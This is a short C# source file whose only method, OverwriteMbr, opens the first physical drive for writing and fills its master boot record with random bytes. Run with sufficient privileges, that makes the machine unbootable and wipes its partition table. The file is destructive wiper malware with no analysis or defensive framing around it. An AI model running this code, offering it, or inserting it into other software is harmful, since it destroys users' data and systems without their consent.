using System;
using System.IO;

public class MBR
{
    private const int MBR_SIZE = 512;
    public static void OverwriteMbr()
    {
        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
        {
            byte[] mbrData = new byte[MBR_SIZE];
            Random rand = new Random();
            rand.NextBytes(mbrData);
            fs.Write(mbrData, 0, MBR_SIZE);
        }
    }
}
